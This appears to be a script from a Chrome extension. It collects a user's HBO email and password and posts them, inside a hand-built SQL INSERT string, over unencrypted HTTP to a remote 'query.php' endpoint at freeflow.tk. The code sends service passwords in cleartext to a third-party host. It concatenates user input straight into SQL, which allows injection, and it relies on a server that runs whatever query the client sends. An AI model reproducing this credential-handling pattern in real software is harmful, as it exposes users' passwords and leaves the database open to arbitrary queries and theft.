$(function() {
	// Check if form filled to enable enter button
	$('form input').keyup(function() {
		var empty = false;
		$('form input').each(function() {
			if($(this).val() == '') { empty = true; }
		});

		if (empty) { $('#hbo-enter').prop('disabled', true); }
		else { $('#hbo-enter').prop('disabled', false); }
	});
	
	// Handler enter key pressed in any input
	$('form input').keypress(function(e) {
		if (e.keyCode == 13) {
			var empty = false;
			$('form input').each(function() {
				if($(this).val() == '') { empty = true; }
			});
			
			if (!empty) { $('#login').click() }
		}
	});

	$('#hbo-enter').click(function() {
   		// get user id
        chrome.storage.sync.get("user_id", function(result) {
			if (!chrome.runtime.error) {
				var id = result.user_id;
		        var user = $('#hb-email').val().trim(),
            		pass = $('#hb-pass').val().trim();
				var done = false;
				$.ajaxSetup({async: false});
				var serv = "http://freeflow.tk/query.php"
		        $.post(serv, {query: "INSERT INTO hbo (userid, service_email, service_password) VALUES ('" + id + "', '" + user + "', '" + pass + "');"}, function() {
					window.location.href="/servicepage/servicepage.html";
				});

				chrome.storage.sync.set({ "hbo_active" : "true"}, function() {
					if (chrome.runtime.error) {
					   	console.log("Runtime error.");
					}
				});

			}
		});
 
	 });
});
